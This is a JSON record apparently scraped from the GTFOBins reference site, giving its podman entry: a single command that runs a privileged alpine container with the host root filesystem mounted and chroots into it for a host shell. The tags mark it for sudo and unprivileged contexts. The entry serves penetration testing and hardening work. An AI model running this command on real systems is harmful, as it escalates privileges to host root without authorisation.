{"title": "podman", "source": "gtfobins", "source_label": "GTFOBins", "path": "podman", "html": "<h1>podman</h1>\n<h2>Shell</h2>\n<p>This requires an actual image to be available (e.g., `alpine`) downloading it if not present.</p>\n<pre><code class=\"language-bash\">podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh</code></pre>", "excerpt": "podman Shell This requires an actual image to be available (e.g., `alpine`) downloading it if not present. podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh", "tags": ["func:shell", "ctx:sudo", "ctx:unprivileged"]}